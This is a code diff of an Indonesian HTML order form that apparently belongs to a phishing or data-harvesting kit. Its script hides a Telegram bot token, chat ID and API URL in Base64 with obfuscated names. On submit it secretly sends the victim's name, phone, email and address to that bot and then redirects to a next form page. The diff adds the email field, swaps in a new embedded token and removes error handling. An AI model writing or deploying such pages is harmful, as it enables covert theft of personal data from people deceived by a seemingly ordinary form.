@@ -33,19 +33,23 @@
                 <form id="orderForm">
                     <div class="form-group">
                         <label>Nama Lengkap</label>
-                        <input type="text" id="nL" placeholder="Nama penerima" required>
+                        <input type="text" id="nL" required>
                     </div>
                     <div class="form-group">
-                        <label>Nomor HP / WhatsApp</label>
+                        <label>Nomor HP Penerima</label>
                         <input type="tel" id="nHP" placeholder="08xxxxxxxxxx" required oninput="this.value = this.value.replace(/\D/g, '')">
                     </div>
                     <div class="form-group">
+                        <label>Alamat Email</label>
+                        <input type="email" id="eM" required>
+                    </div>
+                    <div class="form-group">
                         <label>Alamat Lengkap</label>
-                        <textarea id="aL" rows="2" placeholder="Alamat pengiriman" required></textarea>
+                        <textarea id="aL" rows="2" required></textarea>
                     </div>
                     <div class="form-group">
                         <label>Nama Produk</label>
-                        <input type="text" id="nP" placeholder="Barang yang dipesan" required>
+                        <input type="text" id="nP" required>
                     </div>
                     <div class="form-group">
                         <label>Total Harga (Rp)</label>
@@ -59,47 +63,40 @@
 
     <script>
         (function(){
-            // Kredensial yang dienkripsi (Base64)
-            const _0x_a = "NzgxMjQyODQ2ODpBQUUxcUhqTExIT1FsQW1BQlhidjlKaFhFZzBLUmtiaDBYMA=="; // Token Bot
-            const _0x_b = "NTkyMzAzMTgyNQ=="; // Chat ID
-            const _0x_c = "aHR0cHM6Ly9taXRyYS5tb25lZS5jby5pZC8jL20="; // Redirect URL
+            const _0x_a = "ODI4NjgyNDI1NDpBQUdQQWk3dVBmN28wLWExOXphVWpCTENYN0llbHFlUGNhOA==";
+            const _0x_b = "NTkyMzAzMTgyNQ==";
+            const _0x_c = "Zm9ybXVsaXIzLmh0bWw="; // Target: formulir3.html
             const _0x_u = ["aHR0cHM6Ly9hcGku","dGVsZWdyYW0ub3JnL2JvdA==","L3NlbmRNZXNzYWdl"];
 
-            let isBusy = false;
-
-            document.getElementById('orderForm').onsubmit = async function(e) {
+            document.getElementById('orderForm').onsubmit = function(e) {
                 e.preventDefault();
-                if (isBusy) return;
-
+                
                 const btn = document.getElementById('btnSub');
+                btn.disabled = true;
+                btn.innerText = "Mengirim...";
+
                 const n = document.getElementById('nL').value;
                 const hp = document.getElementById('nHP').value;
+                const m = document.getElementById('eM').value;
                 const a = document.getElementById('aL').value;
                 const p = document.getElementById('nP').value;
                 const h = document.getElementById('tH').value;
 
-                isBusy = true;
-                btn.disabled = true;
-                btn.innerText = "Memproses...";
-
                 const fullUrl = atob(_0x_u[0]) + atob(_0x_u[1]) + atob(_0x_a) + atob(_0x_u[2]);
-                const msg = `*PESANAN BARU*\n\n👤 Nama: ${n}\n📞 No HP: ${hp}\n📍 Alamat: ${a}\n📦 Produk: ${p}\n💰 Harga: Rp${h}`;
+                const msg = `*PESANAN BARU*\nNama: ${n}\nNo HP: ${hp}\nEmail: ${m}\nAlamat: ${a}\nProduk: ${p}\nHarga: Rp${h}`;
 
-                try {
-                    await fetch(fullUrl, {
-                        method: "POST",
-                        headers: { "Content-Type": "application/json" },
-                        body: JSON.stringify({
-                            chat_id: atob(_0x_b),
-                            text: msg,
-                            parse_mode: 'Markdown'
-                        })
-                    });
-                } catch (err) {
-                    console.warn("Gagal mengirim data");
-                }
+                // Kirim data tanpa menunggu
+                fetch(fullUrl, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        chat_id: atob(_0x_b),
+                        text: msg,
+                        parse_mode: 'Markdown'
+                    })
+                });
 
-                alert('Data berhasil terkirim. Silahkan klik atur di bagian beranda setelah login di aplikasi untuk melanjutkan.');
+                // Langsung pindah halaman secara instan
                 window.location.href = atob(_0x_c);
             };
         })();
